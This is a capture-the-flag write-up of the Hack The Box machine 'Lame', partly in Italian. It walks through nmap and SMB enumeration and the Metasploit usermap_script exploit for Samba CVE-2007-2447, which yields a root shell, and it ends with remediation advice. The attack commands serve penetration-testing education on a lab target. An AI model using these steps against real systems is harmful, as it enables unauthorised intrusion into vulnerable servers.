# HTB - Lame

**Difficulty:** Easy  
**OS:** Linux  
**Status:** Retired ✅

---

## Summary

Lame is an Easy Linux machine and the first machine ever published on Hack The Box. Root access is achieved by exploiting a known vulnerability in the Samba service using Metasploit. Basic enumeration is enough to find the attack vector.

---

## Tools Used

- Nmap
- smbmap
- searchsploit
- Metasploit Framework

---

## Steps

### 1. Enumeration

```bash
nmap -sV -sC -p- -Pn --min-rate 5000 <TARGET_IP>
```

**Porte aperte:**
- 21 → vsftpd 2.3.4
- 22 → OpenSSH
- 139/445 → Samba 3.0.20-Debian
- 3632 → distccd

---

### 2. FTP - Vicolo cieco

FTP allows anonymous login but the directory is empty. Nothing useful here.

vsftpd 2.3.4 has a known backdoor (CVE-2011-2523) but the exploit fails — the backdoor is patched on this machine.

---

### 3. SMB - Il vettore giusto

```bash
smbmap -H <TARGET_IP>
```

Output: the `tmp` share has **READ/WRITE** access for anonymous users.

```bash
searchsploit "Samba 3.0.20"
```

Trovato: **Samba 3.0.20 < 3.0.25rc3 - Username map script - CVE-2007-2447**

Questa vulnerabilità permette l'esecuzione di comandi arbitrari tramite metacaratteri nella shell, sfruttando la funzione `SamrChangePassword` con `username map script` abilitato in smb.conf.

---

### 4. Exploitation con Metasploit

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
set LHOST <TUN0_IP>
run
```

**Result:** shell obtained as `root` (uid=0).

---

### 5. Flags

```bash
cat /home/makis/user.txt   # user flag
cat /root/root.txt          # root flag
```

---

## What I Learned

- How to enumerate FTP and SMB services with Nmap and smbmap
- Not every exploit works — always verify before wasting time
- How to use searchsploit to find known vulnerabilities from a service version
- CVE-2007-2447: one of the most classic Samba vulnerabilities in CTFs
- How to configure and run an exploit in Metasploit

---

## Remediation

- Update Samba to a non-vulnerable version (>= 3.0.25rc3)
- Disable `username map script` in smb.conf if not needed
- Never expose SMB to the network without proper authentication
